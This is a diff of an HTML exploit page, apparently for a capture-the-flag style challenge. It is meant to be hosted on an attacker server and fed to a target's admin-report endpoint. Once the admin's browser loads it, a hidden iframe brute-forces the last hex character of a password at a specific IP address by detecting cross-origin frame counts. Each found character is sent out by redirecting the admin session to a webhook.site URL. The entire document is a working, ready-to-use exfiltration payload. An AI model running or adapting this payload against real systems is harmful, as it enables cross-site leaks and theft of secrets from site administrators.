@@ -2,31 +2,34 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Admin Session Brute Force Payload</title>
+    <title>Leakss Admin Session Exploit Payload (Path Leak)</title>
     <!-- 
-        This payload is designed to be executed by the admin's browser 
-        when they visit: /report?url=http://attacker.com/admin_payload.html 
+        HOST THIS FILE on your attacker server (e.g., http://attacker.com/exploit.html)
+        THEN submit that URL to the target's /report?url= endpoint.
     -->
     <style>
-        /* Minimal styling as this page runs autonomously in the background */
         body { background-color: #f0f0f0; color: #333; font-family: monospace; padding: 20px; }
-        #status-message { font-size: 14px; color: #059669; }
+        #status-message { font-size: 14px; color: #cc5500; }
         .log-entry { margin-bottom: 5px; }
     </style>
 </head>
 <body>
 
-    <div id="status-message">Executing Admin-Session Brute Force... Check Attacker Logs.</div>
+    <div id="status-message">Executing Admin-Session Brute Force... **Ensure this page is hosted externally.**</div>
     <div id="log-container"></div>
     
-    <!-- The hidden iframe used for the attack -->
+    <!-- The hidden iframe used for the cross-origin structural change detection -->
     <iframe id="targetFrame" style="display: none;"></iframe>
 
     <script>
-        // --- CONFIGURATION ---
+        // --- EXFILTRATION CONFIGURATION ---
+        // Your specific webhook URL provided by the user. 
+        // NOTE: The leaked character will be appended to this URL's path.
+        const WEBHOOK_BASE_URL = 'https://webhook.site/d035f84d-52a7-4f84-af02-2a47782a8150';
+        
+        // --- ATTACK CONFIGURATION ---
         const TARGET_BASE_URL = 'https://31.97.187.222:9999/?pass=lebah'; 
-        const EXFILTRATION_BASE_URL = 'https://webhook.site/d035f84d-52a7-4f84-af02-2a47782a8150/leak_success?char='; // Your server's endpoint to log the result
-        const CHARSET = '0123456789abcdef'; // Assuming the final character is a single hex digit
+        const CHARSET = '0123456789abcdef'; // Target is one final hex digit
         const DELAY_MS = 750; // Delay for the server to process the request and for the iframe to load
         // ---------------------
 
@@ -34,9 +37,6 @@
         const targetFrame = document.getElementById('targetFrame');
         const logContainer = document.getElementById('log-container');
 
-        /**
-         * Logs a message to the page (for debugging while testing the payload).
-         */
         function log(message) {
             const entry = document.createElement('div');
             entry.classList.add('log-entry');
@@ -45,87 +45,67 @@
         }
 
         /**
-         * The crucial bypass: Instead of using blocked network requests (fetch, img, background),
-         * we use a full-page URL redirection (window.location) which the admin's session 
-         * must be able to perform to fulfill the original /report?url= request.
-         * * This redirection creates a new GET request to the Attacker's server, 
-         * which contains the leaked character in the URL query string.
-         * @param {string} foundChar - The character that was successfully brute-forced.
+         * THE CRITICAL BYPASS: Exfiltrates data via full-page redirection 
+         * using the leaked character in the URL PATH.
          */
         function exfiltrateAndStop(foundChar) {
-            log(`SUCCESS! Correct character found: ${foundChar}`);
-            const exfilUrl = EXFILTRATION_BASE_URL + foundChar;
-            log(`Redirecting admin session to exfiltrate data: ${exfilUrl}`);
+            log(`[SUCCESS] Correct character found: ${foundChar}`);
             
-            // This is the final step that bypasses the networking restriction
+            // CONSTRUCT THE FINAL URL WITH THE LEAKED CHARACTER IN THE PATH
+            const exfilUrl = `${WEBHOOK_BASE_URL}/${foundChar}`;
+            
+            log(`[EXFILTRATION] Redirecting admin session to: ${exfilUrl}`);
+            
+            // This line executes the bypass: a top-level browser navigation.
             window.location.href = exfilUrl;
 
-            // In case redirection fails or is delayed, stop further processing
-            throw new Error("Exploit successful, stopping script."); 
+            // Stop the script immediately 
+            throw new Error("Exploit successful, stopped execution after redirection."); 
         }
 
-        /**
-         * Core attack function to test the next character.
-         */
         function testNextCharacter() {
             if (currentCharIndex >= CHARSET.length) {
-                log('Brute force complete. No match found in the current character set.');
+                log('[FINISH] Brute force complete. No match found.');
                 return;
             }
 
             const char = CHARSET[currentCharIndex];
             const fullTargetUrl = TARGET_BASE_URL + char;
 
-            log(`Testing: ${fullTargetUrl}`);
+            log(`[TESTING] Character '${char}' with URL: ${fullTargetUrl}`);
 
-            // 1. Load the target URL with the current guess into the iframe
             targetFrame.src = fullTargetUrl;
 
-            // 2. Wait for the content to load and the server-side vulnerability 
-            //    to potentially trigger the nested iframe (if the password is correct).
             setTimeout(() => {
                 checkFrameState(char);
             }, DELAY_MS);
         }
 
-        /**
-         * Checks the cross-origin property to detect the structural change.
-         * The bypass: accessing iframe.contentWindow.length cross-origin.
-         * @param {string} char - The character being tested.
-         */
         function checkFrameState(char) {
             const targetWindow = targetFrame.contentWindow;
 
             try {
-                // If the server-side pass check is correct, it returns HTML that 
-                // contains the <iframe srcdoc="..."> which results in the nested
-                // iframe count becoming > 0.
+                // Check the cross-origin frame count.
                 const nestedFrameCount = targetWindow.length; 
                 
-                log(`Result for '${char}': Nested frame length is ${nestedFrameCount}.`);
+                log(`[RESULT] Frame length for '${char}' is ${nestedFrameCount}.`);
 
                 if (nestedFrameCount > 0) {
-                    // Leak detected!
                     exfiltrateAndStop(char);
-                    return; // Should be unreachable due to the throw in exfiltrateAndStop
+                    return; 
                 }
 
             } catch (e) {
-                // An exception (like SecurityError) is often thrown when trying to read 
-                // cross-origin properties, which is expected and does not necessarily 
-                // indicate failure for this specific attack, but we must ignore it 
-                // and proceed if the length check didn't pass before the error.
-                log(`SOP Blocked for '${char}': ${e.name}. Continuing to next character.`);
+                // Ignore SOP errors and continue the loop
+                log(`[SOP] Cross-origin access blocked or error for '${char}': ${e.name}. Continuing.`);
             }
 
-            // 3. Move to the next character if no match was found.
             currentCharIndex++;
             testNextCharacter();
         }
 
-        // Start the attack loop immediately when the admin loads the page
         window.onload = function() {
-            log('Payload loaded by admin session.');
+            log('Payload loaded. Initiating brute force sequence...');
             testNextCharacter();
         };
     </script>
